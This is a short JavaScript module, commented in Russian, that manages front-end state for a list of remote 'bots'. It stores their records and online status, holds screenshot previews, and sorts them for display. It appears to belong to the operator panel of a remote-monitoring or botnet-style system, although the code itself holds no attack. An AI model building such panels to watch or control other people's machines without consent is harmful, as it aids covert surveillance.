let clients = {};
const emit = (name, detail = null) => window.dispatchEvent(new CustomEvent(name, { detail }));

/**
 * Массовое обновление (обычно при загрузке страницы)
 */
export const updateClients = (list) => {
    list.forEach(c => {
        // Просто сохраняем всё, что прислал сервер (БД + статус)
        clients[c.id] = { 
            ...c,
            lastPreview: clients[c.id]?.lastPreview || null 
        };
    });
    emit('clientsUpdated');
};

/**
 * Одиночное обновление (события DataScribe или смена статуса)
 */
export const updateClient = (data) => {
    if (!data?.id) return;

    const old = clients[data.id];
    
    // Если бота нет в базе, создаем его только если данных достаточно (есть pc_name)
    // Иначе это просто "пакет смерти" для несуществующего бота
    if (!old && !data.pc_name) return;

    // Склеиваем старые данные с новыми
    // Иерархия: Новые данные от сервера ПЕРЕКРЫВАЮТ старые.
    clients[data.id] = {
        ...old,
        ...data
    };

    // Всегда уведомляем UI, так как статус или данные окна изменились
    emit('clientsUpdated');
};

/**
 * Установка превью (скриншота) с очисткой памяти
 */
export const setClientPreview = (id, url) => {
    if (!clients[id]) return;
    
    // Освобождаем память от старого Blob URL, чтобы вкладка не "толстела"
    if (clients[id].lastPreview && clients[id].lastPreview.startsWith('blob:')) {
        URL.revokeObjectURL(clients[id].lastPreview);
    }
    clients[id].lastPreview = url;
};

/**
 * Полное удаление бота из интерфейса
 */
export const removeClient = (id) => {
    if (clients[id]) {
        if (clients[id].lastPreview?.startsWith('blob:')) {
            URL.revokeObjectURL(clients[id].lastPreview);
        }
        delete clients[id];
        emit('clientsUpdated');
    }
};

/**
 * ЛОГИКА ТАЙМЕРОВ УДАЛЕНА.
 * Фронтенд больше не гасит ботов сам. 
 * Источник статуса — только сервер.
 */

/**
 * Получение списка для отрисовки (Сортировка: Сначала Онлайн, потом по ID)
 */
export const getAllClients = () => {
    return Object.values(clients).sort((a, b) => {
        const aOn = a.status === 'online';
        const bOn = b.status === 'online';
        if (aOn && !bOn) return -1;
        if (!aOn && bOn) return 1;
        return a.id.localeCompare(b.id);
    });
};